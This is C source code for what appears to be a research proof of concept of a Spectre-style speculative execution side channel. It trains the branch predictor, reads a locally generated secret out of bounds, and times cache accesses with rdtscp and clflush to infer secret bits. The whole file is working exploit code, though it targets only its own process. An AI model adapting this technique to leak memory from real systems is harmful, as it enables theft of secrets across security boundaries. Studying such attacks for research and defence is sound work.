#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char secret[1001];

uint8_t array3[200000];

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
uint8_t A, y;
uint64_t a0, a1;
size_t delta;

uint64_t victim_function(size_t x)
{
    /*
    * speculative interference attack
    * reverse engineering number of L1-D-Cache MSHRs
    * by secret dependent attack
    */
    uint64_t time1, time2, time3, time4;
    unsigned int junk = 0;

    _mm_lfence();
    
    A = array3[x];
    time1 = __rdtscp(&junk);
    y = array3[A];
    if (x < array1_size) // mispredict
    {
        //temp &= array2[array1[x] * 512];
        temp = array1[x]; //access secret
        uint8_t x0 = array2[temp * 512 * 0];
        uint8_t x1 = array2[temp * 512 * 1];
        uint8_t x2 = array2[temp * 512 * 2];
        uint8_t x3 = array2[temp * 512 * 3];
        uint8_t x4 = array2[temp * 512 * 4];
        uint8_t x5 = array2[temp * 512 * 5];
        uint8_t x6 = array2[temp * 512 * 6];
        uint8_t x7 = array2[temp * 512 * 7];
        uint8_t x8 = array2[temp * 512 * 8];
        uint8_t x9 = array2[temp * 512 * 9];
        uint8_t x10 = array2[temp * 512 * 10];
        uint8_t x11 = array2[temp * 512 * 11];
        uint8_t x12 = array2[temp * 512 * 12];
        uint8_t x13 = array2[temp * 512 * 13];
        uint8_t x14 = array2[temp * 512 * 14];
        uint8_t x15 = array2[temp * 512 * 15];
        /*uint8_t x16 = array2[temp * 512 * 16];
        uint8_t x17 = array2[temp * 512 * 17];
        uint8_t x18 = array2[temp * 512 * 18];
        uint8_t x19 = array2[temp * 512 * 19];
        uint8_t x20 = array2[temp * 512 * 20];
        uint8_t x21 = array2[temp * 512 * 21];
        uint8_t x22 = array2[temp * 512 * 22];
        uint8_t x23 = array2[temp * 512 * 23];
        uint8_t x24 = array2[temp * 512 * 24];
        uint8_t x25 = array2[temp * 512 * 25];
        uint8_t x26 = array2[temp * 512 * 26];
        uint8_t x27 = array2[temp * 512 * 27];
        uint8_t x28 = array2[temp * 512 * 28];
        uint8_t x29 = array2[temp * 512 * 29];
        uint8_t x30 = array2[temp * 512 * 30];
        uint8_t x31 = array2[temp * 512 * 31];*/
    }
    time2 = __rdtscp(&junk) - time1;
    //printf("Time : %llu\n", time2);
    return time2;
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
uint64_t readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2, time3, time4, time5;
    volatile uint8_t *addr;
    uint64_t t = 0;

    time3 = __rdtscp(&junk);
    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--)
    {

        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--)
        {
            _mm_clflush(&array1_size);
            for (k = 0; k < 32; k++)
                _mm_clflush(&array2[k * 512]);
            for (volatile int z = 0; z < 100; z++)
            {
            } /* Delay (can also mfence) */

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16));         /* Set x=-1 if j%6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            time5 = victim_function(x);
            if (j == 0)
                t += time5;
            _mm_clflush(&array3[0]);
            _mm_clflush(&array3[array3[x]]);
            _mm_clflush(&array3[x]);
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);         /* READ TIMER */
            junk = *addr;                    /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
    time4 = __rdtscp(&junk) - time3;
    printf("Time : %llu\n", t / 1000);
    return t / 1000;
    //printf("Time : %llu\n", time4);
}

void generateSecret()
{
    /*
    * generate secret bit by bit
    * generate array3 with random number to craft stall
    */
    srand(time(0));
    int i;
    for (i = 0; i < 1000; i++)
        secret[i] = rand() & 1;
    for (i = 0; i < 120; i++)
        printf("*");
    printf("\nSecret: \n");
    for (i = 0; i < 100; i++)
        printf("%d", secret[i]);
    printf("\n");
    for (i = 0; i < 120; i++)
        printf("*");
    
    for (i = 0; i < 200000; i++)
    {
        array3[i] = ((rand() % 32768) * rand()) % 200000;
    }
}

int main(int argc,
         const char **argv)
{
    size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
    delta = malicious_x;
    int i, score[2], len = 40;
    uint8_t value[2];

    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    if (argc == 3)
    {
        sscanf(argv[1], "%p", (void **)(&malicious_x));
        malicious_x -= (size_t)array1; /* Convert input value into a pointer */
        sscanf(argv[2], "%d", &len);
    }

    generateSecret();

    len = 80;

    unsigned int junk = 0;
    register uint64_t time1, time2, time3, time4;
    a0 = 0, a1 = 0;
    int cnt0 = 0, cnt1 = 0, last;
    uint64_t res = 0;

    time3 = __rdtscp(&junk);
    printf("Reading %d bytes:\n", len);
    while (--len >= 0)
    {
        //printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        res = readMemoryByte(malicious_x++, value, score);
        if (len == 79)
        {
            last = secret[79 - len];
        }
        else
        {
            if (secret[79 - len] != last)
            {
                if (secret[79 - len] == 0)
                    a0 += res, cnt0++;
                else
                    a1 += res, cnt1++;
            }
        }
        last = secret[79 - len];
        
        /*printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X=’%c’ score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        printf("\n");*/
    }
    time4 = __rdtscp(&junk) - time3;
    printf("Time = %llu\n", time4);
    printf("avg0 : %llu\navg1 : %llu\n", a0 / cnt0, a1 / cnt1);
    return (0);
}